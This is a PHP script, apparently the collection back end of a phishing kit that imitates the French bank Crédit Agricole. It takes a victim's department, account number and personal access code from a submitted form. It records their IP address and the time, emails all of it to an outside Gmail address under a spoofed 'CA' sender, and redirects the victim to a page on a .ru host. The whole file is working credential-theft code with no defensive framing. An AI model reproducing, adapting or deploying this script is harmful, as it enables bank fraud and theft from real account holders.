<?
$ip = getenv("REMOTE_ADDR");
//date_default_timezone_set('UTC');
$time       = date( "M j, Y | G:i:s A" );


$from = $_POST['departement'];
$pass = $_POST['CCPTE'];
$usr = $_POST['CCCRYC'];




$message .= "#=========[ $time ]=========#\n";
$message .= "DEPARTEMENT :  ".$_POST['departement']."\n";
$message .= "N° DE COMPTE :  ".$_POST['CCPTE']."\n";
$message .= "CODE PERSONNEL :  ".$_POST['CCCRYC']."\n";
$message .= "#======[ $from ]======#\n";

$send = "wavesbarrel@gmail.com";
$subject = "[AGRICOLE $ip ]";
$from = "From: CA <notifications@vif8a.com>";
mail($send,$subject,$message,$from);

echo "<meta http-equiv='refresh' content='0; url=http://www.exterragroup.ru/local/templates/cim/index2.html'/>";

	

?>